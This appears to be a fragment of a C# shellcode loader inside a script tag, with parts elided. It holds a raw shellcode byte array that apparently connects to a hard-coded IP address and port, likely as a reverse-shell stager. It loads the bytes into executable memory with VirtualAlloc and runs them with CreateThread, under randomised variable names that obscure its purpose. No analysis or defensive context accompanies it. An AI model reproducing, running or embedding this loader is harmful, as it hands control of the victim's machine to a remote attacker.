...
0x68,0x2f,0x6b,0x52,0x31,0x68,0x02,0x00,0x09,0x1e,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
...
0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr mEqL9Firb = VirtualAlloc(IntPtr.Zero,(UIntPtr)mC73.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(mC73,0,mEqL9Firb,mC73.Length);
        IntPtr e3gX0qMadcrs = IntPtr.Zero;
        IntPtr aEszua = CreateThread(IntPtr.Zero,UIntPtr.Zero,mEqL9Firb,IntPtr.Zero,0,ref e3gX0qMadcrs);
    }
</script>
